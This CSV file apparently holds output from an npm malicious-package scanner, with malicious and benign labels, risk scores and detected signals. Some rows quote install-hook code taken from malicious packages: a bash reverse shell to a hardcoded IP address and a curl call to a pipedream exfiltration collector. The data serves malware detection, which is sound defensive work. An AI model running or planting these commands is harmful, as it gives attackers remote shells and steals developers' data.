package_name,version,label,timestamp,routing,risk_score,confidence,primary_category,confirmed_count,supporting_count,noise_filtered,layer1_count,layer2_count,sources_analyzed,has_js_source,confirmed_signals_json,supporting_signals_json
@aaakca/myf,1.0.14,malicious,2026-03-14T21:32:17.845804,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@alfalab/core-components,37.3.0-beta.10,malicious,2026-03-14T21:32:17.850430,skip,0.0,0.2,none,0,0,0,0,0,none,False,[],[]
@anemone95/evil,1.0.9,malicious,2026-03-14T21:32:17.856509,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@arkadium/eagle-user-client,9.1.1,malicious,2026-03-14T21:32:17.867700,review,0.364,0.78,network_exfiltration,1,0,0,1,0,./.pbk.js,True,"[""Signal  : Network Request In Install\nLocation: ./.pbk.js:2\nCode    : const https = require('https');""]",[]
@arkadium/eagle-user-client,9.99.999,malicious,2026-03-14T21:32:17.875591,review,0.494,0.715,network_exfiltration,1,1,0,2,0,./.pbk.js,True,"[""Signal  : Network Request In Install\nLocation: ./.pbk.js:2\nCode    : const https = require('https');""]","[""Signal  : Version contains inflated segment(s) [999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 9.99.999""]"
@aszxc/npmexp,1.0.1,malicious,2026-03-14T21:32:17.879496,flag,1.0,0.9025,backdoor_installation,4,0,0,4,0,none,False,"[""Signal  : Reverse Shell Tcp in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'"", ""Signal  : Interactive Reverse Shell in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'"", ""Signal  : Hardcoded external IP address '39.96.12.202'\nLocation: package.json \u2192 scripts.preinstall\nCode    : bash -c 'bash -i >& /dev/tcp/39.96.12.202/22222 0>&1'"", ""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@att-bit/duc.components.cardshell,10.0.0,malicious,2026-03-14T21:32:17.884749,flag,0.7773,0.835,data_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl https://eo33kmsodf3dxtf.m.pipedream.net/att_h1_bb"", ""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl https://eo33kmsodf3dxtf.m.pipedream.net/att_h1_bb""]",[]
@att-bit/duc.components.cardshell,10.0.1,malicious,2026-03-14T21:32:17.890554,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@att-bit/duc.components.cardshell,10.0.2,malicious,2026-03-14T21:32:17.896865,review,0.364,0.78,network_exfiltration,1,0,0,1,0,"test.js,entry_point",True,"[""Signal  : Network Request In Install\nLocation: test.js:1\nCode    : const https = require('https');""]",[]
@b2bgeo/yav,13.3.8,malicious,2026-03-14T21:32:17.901547,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@actions/core,1.10.1,benign,2026-03-14T21:32:17.946870,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@alifd/next,1.26.24,benign,2026-03-14T21:32:17.951721,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@ampproject/remapping,2.2.1,benign,2026-03-14T21:32:17.991761,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@angular-devkit/core,16.2.3,benign,2026-03-14T21:32:18.008964,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@ant-design/icons,5.2.6,benign,2026-03-14T21:32:18.020409,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@apidevtools/json-schema-ref-parser,11.1.0,benign,2026-03-14T21:32:18.064029,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@apollo/client,3.8.4,benign,2026-03-14T21:32:18.070271,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@assemblyscript/loader,0.27.9,benign,2026-03-14T21:32:18.174691,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@aws-cdk/aws-ec2,1.204.0,benign,2026-03-14T21:32:18.190704,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@azure/abort-controller,1.1.0,benign,2026-03-14T21:32:18.209333,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
